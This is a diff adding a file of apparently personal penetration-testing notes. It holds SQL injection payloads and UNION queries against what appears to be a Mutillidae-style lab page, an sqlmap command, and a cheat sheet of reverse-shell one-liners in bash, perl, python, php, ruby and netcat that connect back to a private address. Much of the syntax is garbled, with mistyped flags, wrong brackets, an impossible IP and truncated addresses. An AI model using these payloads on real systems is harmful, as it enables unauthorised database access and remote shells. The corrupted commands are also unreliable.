@@ -1,0 +1,33 @@
+select * from accounts where user name= 'Admin' and passwords='aaa' or 1=1 #'
+aaa' or 1=1'
+select * from accounts where username = '$USERNAME' and password=' $PASSWORD'
+index.php?page=user.info.php&username=zaid' order by 1&password=123456&user-info-php-submit-button=view+Account+Details
+union select 1,database() ,user() , version() ,5
+union select 1,table_name,null,5 from information_schema.tables
+# sqlmap -u "http://10.20.14.204/mutildae/index.php?page=user.info.php&username=admin&password=aaa&user-info-php-submit-button=view+Account+Details"
+
+
+bash
+bash -1 >& /dev/tcp/10.20.14.283/8888 0>&1
+
+perl
+perl -0 'use socket;$1="10.20.14":$p=8883:socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if
+{connect{S,sockaddr_in($p.inet_aton(&1)))){open{STDOUT.">&S"}:open(STDERR,">&S"):exec
+{"/bin/sh .1"):}:'
+
+
+python
+python -c 'import socket,subprocess,os;s=socket.socket{socket.AF_INET,socket.SOCK_STREAM);s.connect
+{{"10.20.14",8883)):os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dump2(s.dump2(s.fileno
+{}.2) :p=subprocess.call(("/bin/sh",-1"});'
+
+
+php
+php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");
+
+ruby
+ruby -rsocket -o'f=TCPSocket.open("10.20.14",8080).to_1;exec sprintf("/bin/sh -1 <&%d >%d 2>&%
+d",f,f,f)'
+
+netcat
+nc -0/bin/sh 10.20.14.8080
